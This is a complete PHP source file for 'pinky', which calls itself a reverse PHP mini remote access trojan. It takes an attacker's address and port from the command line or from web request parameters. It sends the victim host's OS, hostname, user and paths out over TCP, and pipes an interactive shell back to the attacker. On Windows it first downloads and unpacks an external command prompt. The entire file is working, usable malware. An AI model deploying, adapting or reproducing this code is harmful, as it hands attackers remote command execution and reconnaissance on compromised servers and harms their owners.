<?php
set_time_limit ( 0 );

$version = "0.1";
$author = "David Tavarez (davidtavarez)";
$url = "https://davidtavarez.github.io/pinky/";

if (PHP_SAPI === 'cli' || empty ( $_SERVER ['REMOTE_ADDR'] )) {
	echo chr ( 27 ) . chr ( 91 ) . 'H' . chr ( 27 ) . chr ( 91 ) . 'J';
} else {
	header ( 'Content-type: text/plain' );
}
echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
echo $author . "\n";
echo $url . "\n";

$bin = PHP_BINDIR;
$path = realpath ( NULL ) . '/';
$tmp_path = $path;
$os = null;
$shell = null;

$descriptorspec = array (
		array (
				'pipe',
				'r' 
		),
		array (
				'pipe',
				'w' 
		),
		array (
				'pipe',
				'w' 
		) 
);

$address = '127.0.0.1';
$port = 3391;
$type = 'tcp';

if (PHP_SAPI === 'cli' || empty ( $_SERVER ['REMOTE_ADDR'] )) {
	$params = "a:";
	$params .= "p:";
	$params .= "t:";
	
	$options = getopt ( $params );
	
	if (isset ( $options ['a'] ) == false) {
		exit ( "\nERROR: Server address not provided.\n\n" );
	}
	if (isset ( $options ['p'] ) == false) {
		exit ( "\nERROR: Port number not provided.\n\n" );
	}
	
	$address = $options ['a'];
	$port = ( int ) $options ['p'];
	$type = isset ( $options ['t'] ) ? $options ['t'] : 'tcp';
} else {
	if (isset ( $_GET ['a'] ) == false) {
		exit ( "\nERROR: Server address not provided.\n\n" );
	}
	if (isset ( $_GET ['p'] ) == false) {
		exit ( "\nERROR: Port number not provided.\n\n" );
	}
	
	$address = $_GET ['a'];
	$port = ( int ) $_GET ['p'];
	$type = isset ( $_GET ['t'] ) ? $_GET ['t'] : 'tcp';
}

echo "\nChecking if function \e[1mproc_open\e[0m is available... ";

if (function_exists ( 'proc_open' )) {
	echo "Ok.\n";
} else {
	exit ( "Failed." );
}

echo "Detecting Operative System... ";
$os = strtoupper ( substr ( PHP_OS, 0, 3 ) );
echo "Ok.\n";

if ($os === 'WIN') {
	$bytes = 0;
	
	$ziparchive = false;
	
	$sevenzip = false;
	$sevenzip_file = "7z1604.exe";
	
	$cmder_zip = "cmder_mini.zip";
	$cmder = "Cmder.exe";
	$cmder_path = "cmder/";
	$cmder_url = "https://github.com/cmderdev/cmder/releases/download/v1.3.2/cmder_mini.zip";
	$cmder_version = "1.3.2";
	
	echo "\t\e[1mWindows\e[0m detected, we're going to download an external command prompt.\n";
	echo "\tFinding a writable path...\n";
	echo "\t\tTesting the current directory... ";
	
	if (is_writable ( $tmp_path )) {
		echo "yes.\n";
		echo "\t\tUsing " . $tmp_path . " to store files.\n";
	} else {
		echo "no.\n";
		$tmp_path = "C:\Windows\Temp\\";
		echo "\t\tTesting with " . $tmp_path . " ... ";
		if (is_writable ( $tmp_path )) {
			echo "yes.\n";
			echo "\tUsing " . $tmp_path . " to store files.\n";
		} else {
			exit ( "\n\t\tNo writable path found... exiting.\n\n" );
		}
	}
	
	echo "\tChecking if \e[1mZipArchive\e[0m is available... ";
	if (class_exists ( 'ZipArchive' )) {
		echo "yes.\n";
	} else {
		echo "no.\n";
		echo "\t\tDownloading 7zip to unzip files... ";
		$bytes = file_put_contents ( $tmp_path . $sevenzip_file, fopen ( "http://www.7-zip.org/a/7z1604.exe", 'r' ) );
		if ($bytes > 0) {
			echo "Ok.\n";
			$sevenzip = true;
		}
	}
	
	echo "\tDownloading \e[1mcmder " . $cmder_version . "\e[0m ... ";
	$bytes = file_put_contents ( $tmp_path . $cmder_zip, fopen ( $cmder_url, 'r' ) );
	if ($bytes > 0) {
		echo "Ok.\n";
		echo "\t\tTrying to unzip the file... ";
		if ($ziparchive) {
			$unzip = new ZipArchive ();
			if ($unzip->open ( $tmp_path . $cmder_zip )) {
				$unzip->extractTo ( $tmp_path . $cmder_path );
				$unzip->close ();
				echo "Ok.\n";
			} else {
				exit ( " Failed.\n\n" );
			}
		} else {
			$cmd = $tmp_path . $sevenzip_file . ' x ' . $cmder_zip . ' -o' . $tmp_path . $cmder_path;
			proc_open ( $cmd, $descriptorspec, $pipes, $path, null );
			
			if (file_exists ( $tmp_path . $cmder_path . $cmder )) {
				echo " Ok.\n";
			} else {
				exit ( " Failed.\n\n" );
			}
		}
		$shell = $tmp_path . $cmder_path . $cmder;
	} else {
		// TODO: Try to execute a payload.
	}
	echo "Now we have shell we can continue.\n";
} else {
	echo "\t\e[1m*nix\e[0m detected, we're using \e[1mdash\e[0m.\n";
	$shell = '/bin/sh -i';
}

echo "Trying to open connection with the server... ";
$session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );

if (! $session) {
	exit ( "ERROR: " . $errstr . "\n\n" );
} else {
	echo "Connection stablished with \e[1m" . $type . "\e[0m://\e[1m" . $address . "\e[0m:\e[1m" . $port . "\e[0m/\n";
	
	// Send client information.
	echo "Sending client information...\n";
	
	// System
	stream_socket_sendto ( $session, php_uname ( 's' ) . ' ' . php_uname ( 'v' ) );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Machine
	stream_socket_sendto ( $session, php_uname ( 'm' ) );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Hostname
	stream_socket_sendto ( $session, php_uname ( 'n' ) );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Userser
	stream_socket_sendto ( $session, get_current_user () );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Bin Path
	stream_socket_sendto ( $session, $bin );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Client Path
	stream_socket_sendto ( $session, $path );
	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
	
	// Start the session.
	echo "Starting shell... ";
	$process = null;
	$process_status = null;
	$process = proc_open ( $shell, $descriptorspec, $pipes, $path, null );
	$process_status = proc_get_status ( $process );
	echo "Ok.\n";
	
	// Set everything to non-blocking
	stream_set_blocking ( $pipes [0], 0 );
	stream_set_blocking ( $pipes [1], 0 );
	stream_set_blocking ( $pipes [2], 0 );
	
	stream_set_blocking ( $session, 0 );
	
	while ( $session != false ) {
		$read = array (
				$session,
				$pipes [1],
				$pipes [2] 
		);
		$write = NULL;
		$except = NULL;
		
		stream_select ( $read, $write, $except, 0 );
		
		if (in_array ( $session, $read )) {
			$input = fread ( $session, 1024 );
			if (strlen ( $input ) > 0) {
				if (strpos ( $input, '--pinky-' ) === 0) {
					$command = strtolower ( substr ( $input, strlen ( '--pinky-' ) - strlen ( $input ) ) );
					switch ($command) {
						case 'stop' :
							stream_socket_sendto ( $session, 'OK' );
							echo "Closing session... ";
							stream_socket_shutdown ( $session, STREAM_SHUT_WR );
							fclose ( $session );
							fclose ( $pipes [0] );
							fclose ( $pipes [1] );
							fclose ( $pipes [2] );
							proc_close ( $process );
							$session = false;
							break;
						default :
							stream_socket_sendto ( $session, "ERROR: Command \e[1m" . $command . "\e[0m not found.\n" );
					}
				} else {
					fwrite ( $pipes [0], $input );
				}
			}
		}
		
		if (in_array ( $pipes [1], $read )) {
			fwrite ( $session, fread ( $pipes [1], 1024 ) );
		}
		
		if (in_array ( $pipes [2], $read )) {
			fwrite ( $session, fread ( $pipes [2], 1024 ) );
		}
	}
}

echo "Done.\n\n";